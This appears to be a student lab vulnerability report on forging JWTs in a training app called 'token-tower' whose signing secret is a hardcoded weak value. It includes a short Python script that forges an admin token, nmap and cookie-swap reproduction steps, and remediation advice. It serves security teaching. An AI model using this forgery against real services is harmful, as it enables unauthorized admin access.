**CVE-ID**: EDU-TOKENTOWER-2026-T03-007    
**Title**: JWT Token Forgery via Weak Secret Key    
**Affected Lab**: token-tower  
**Component**: JWT Authentication   
**Severity**: Critical  
**CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  
**CVSS Score**: 9.1  


**Description**:  
The Token Tower application uses JSON Web Tokens (JWT) for session management with a hardcoded, weak secret key (`secret123`). This allows any attacker to forge valid JWT tokens with arbitrary claims, including privilege escalation to `admin` role. The vulnerability stems from insufficient secret key complexity and lack of server-side token validation best practices.


**Proof of Concept**:  

<img width="800" height="728" alt="T03-07-1" src="https://github.com/user-attachments/assets/02d4f446-0067-47d6-9a6d-2414c72db0dd" />

<img width="800" height="531" alt="T03-07-2" src="https://github.com/user-attachments/assets/51d63ddb-3d6e-4217-8d51-a25c07726838" />

Payload :
```python
import jwt
import datetime

secret = "secret123"
algorithm = "HS256"

payload = {
    "user": "wise",
    "user_id": 67,
    "role": "admin",  # Escalated privilege
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
}

token = jwt.encode(payload, secret, algorithm=algorithm)
print(f"[+] Forged JWT: {token}")
```

**Steps to Reproduce**:  
1. Determine deserial-gate IP by using commands `sudo docker ps` followed by `sudo docker inspect [CONTAINERID]`. Or any other method of choice.
2. Perform nmap scan on the found IP by also enabling the default scripts: `nmap -sV -sC -T5 -p- [token-towerIP]`. Output will show a http service at port 5020
3. open the website: `http:[token-towerIP]:5020/`
4. Log in with provided guest credentials
5. Open Developer Tools → Application/Storage → Cookies → Copy the JWT `token` value
6. Paste token into `https://jwt.io`, notice the secret secret123
7. Generate a new JWT token with the provided payload above that utilizes the found secret
8. Replace cookie value in your browser with forged token, refresh page
9. Observe admin dashboard/access granted

**Remediation**:
1. Use a strong, randomly generated secret key
2. Never hard code secrets
3. Add server side role validation
4. Rate limiting and monitoring

**Discovered By**: Team 3  
**Date**: 2026-02-17
